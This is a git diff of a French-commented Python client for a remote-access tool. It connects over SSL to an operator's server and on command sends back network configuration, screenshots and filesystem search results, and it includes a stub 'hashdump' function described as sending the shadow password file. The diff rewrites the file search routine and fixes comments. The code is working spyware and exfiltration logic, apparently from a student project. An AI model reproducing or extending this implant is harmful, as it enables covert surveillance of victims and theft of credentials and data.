@@ -39,7 +39,7 @@ def ipconfig(ssl_socket):
         conf = subprocess.run(['ipconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)  # Exécution de la commande "ipconfig" et stockage de ses sorties
         conf_to_send = conf.stdout + conf.stderr  # Concaténation des sorties de la commande "ipconfig"
     else:
-        conf_to_send = "OS non reconnu"  # Gestion d'erreur
+        conf_to_send = "OS non reconnu" # Gestion d'erreur
     ssl_socket.send(conf_to_send.encode())  # Envoie de la configuration au serveur
 
 # Fonction permettant d'envoyer la capture d'écran au serveur
@@ -48,7 +48,7 @@ def screenshot(ssl_socket):
     screenshot.save('screenshot.png')  # Sauvegarder la capture d'écran dans un fichier
     with open('screenshot.png', 'rb') as screenshot_file:  # Ouverture de la capture d'écran
         while True:
-            screenshot_to_send = screenshot_file.read(4096)  # Stokage des données de la capture d'écran
+            screenshot_to_send = screenshot_file.read(4096)  # Stockage des données de la capture d'écran
             if not screenshot_to_send:
                 break
             ssl_socket.send(screenshot_to_send)  # Envoie de la capture d'écran
@@ -56,23 +56,22 @@ def screenshot(ssl_socket):
 
 # Fonction permettant de localiser le fichier demandé par le serveur
 def search(ssl_socket):
-    recherche_received = ssl_socket.recv(1024).decode() # Récupération du nom du fichier recherché
-    print('reçu')
-    command, fichier_search = recherche_received.split(':', 1) # Séparation de la commande pour récupération du nom du fichier recherché
-    recherche = subprocess.run(['find', '/', '-name', fichier_search], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) # Exécution de la commande "find" et stockage de ses sorties
-    print('recherche faite')
-    recherche_to_send = recherche.stdout + recherche.stderr # Concaténation des sorties de la commande "find"
-    ssl_socket.send(recherche_to_send.encode()) # Envoie de la recherche au serveur
+    recherche_received = ssl_socket.recv(4096).decode() # Récupération du nom du fichier à rechercher
+    recherche = []
+    for racine, dirs, dossiers in os.walk("/"): # Parcours du système de fichiers
+        if recherche_received in dossiers:
+            recherche.append(os.path.join(racine, recherche_received)) # Ajout du chemin du fichier trouvé aux résultats
+    if recherche:
+        recherche_to_send = "\n".join(recherche) # Concaténation des chemins des fichiers trouvés
+    else:
+        recherche_to_send = "Aucun fichier trouvé" # Gestion d'erreur
+    ssl_socket.send(recherche_to_send.encode()) # Envoi des résultats de la recherche au serveur
 
 # Fonction permettant d'envoyer le fichier shadow au serveur
 def hashdump(ssl_socket):
     print('hashdump')
 
-
-
-
 def main():
-
     # Récupération des variables
     load_dotenv()
     ip_server = os.getenv('IP_SERVER')
@@ -102,7 +101,7 @@ def main():
             ipconfig(ssl_socket)
         elif command.lower() == 'screenshot':
             screenshot(ssl_socket)
-        elif command.lower() == 'search':
+        elif command.lower().startswith('search'):
             search(ssl_socket)
         elif command.lower() == 'hashdump':
             hashdump(ssl_socket)
